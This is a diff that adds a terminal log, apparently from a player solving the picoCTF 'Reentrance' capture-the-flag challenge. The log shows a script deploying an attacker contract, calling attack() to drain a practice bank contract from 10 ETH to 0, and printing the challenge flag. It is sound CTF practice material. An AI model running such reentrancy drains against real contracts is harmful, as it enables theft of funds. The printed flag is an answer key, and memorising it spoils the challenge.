@@ -1,0 +1,19 @@
+┌─[cristian@Prestige-13-AI]─[~/Documentos/picoCTF/32/Reentrance]
+└──╼ $ python3 solve_reentrance.py
+[+] RPC       = http://crystal-peak.picoctf.net:53715
+[+] chainId   = 31337
+[+] player    = 0xc997F430c24879eD182BEFEe1bFEBf56eA8d529E
+[+] bank      = 0x6Fd09d4d9795a3e07EdDBD9a82c882B46a5A6deF
+[+] balance   = 5 ETH
+[+] bank bal  = 10 ETH
+[+] Compilando Attack.sol...
+[+] Desplegando contrato atacante...
+[+] Deploy tx: 1650e04a1f96514108a151ce8a113d1a09c8be2ce52e6694124c2dfaf6981516
+[+] ATTACK = 0x8Ea78292dEFe9345C2a2781919654Aeea748A6b1
+[+] Bank balance: 10 ETH
+[+] Ejecutando attack() con 1 ETH...
+[+] Attack tx: 43f9c910ae7435a420ee2a4ec8b6ec8c539de9642c86a6f4c97e50eb022cbe06
+[+] Attack status: 1
+[+] Bank balance: 0 ETH
+[+] Leyendo flag...
+[+] FLAG: picoCTF{UpDaTe_St4ate5_1st_abae3b57}
